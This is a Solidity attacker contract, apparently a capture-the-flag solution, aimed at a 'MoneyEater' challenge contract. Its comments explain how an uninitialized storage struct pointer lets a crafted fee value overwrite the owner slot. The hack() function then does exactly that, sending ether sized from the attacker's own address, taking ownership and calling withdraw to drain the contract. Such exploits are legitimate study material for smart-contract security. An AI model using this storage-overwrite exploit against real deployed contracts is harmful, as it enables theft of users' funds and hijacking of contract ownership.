pragma solidity ^0.4.21;


import "./MoneyEater.sol";


contract MoneyEaterAttacker{
    
    MoneyEater player;
    function MoneyEaterAttacker(address _addr)public{
        player = MoneyEater(_addr);
    }

    event isCompleteEvent(bool isComplete);
    //The feed method creates an uninitialized storage pointer
    //When defining structs one should always define the location, either memory or storage.
    //When omitted, storage is assumed
    // The meal.timestamp are allocated in slot 0 and meal.etherAmount in the slot 1(where the owner address is located)

    // need to choose etherAmount in a way such that it overwrites the owner with our
    // address, the scale is wrong as well and uses 10^36 which makes it exploitable

    function hack() public
    {
        // 1 ether := 10**18 => scale is 10**18 * 10**18 = 10**36
        uint256 num_exploit = uint256(address(this)) / 10**36;
        player.feed.value(uint256(address(this)))(num_exploit);
        player.withdraw();
        emit isCompleteEvent(player.isComplete());
    }
}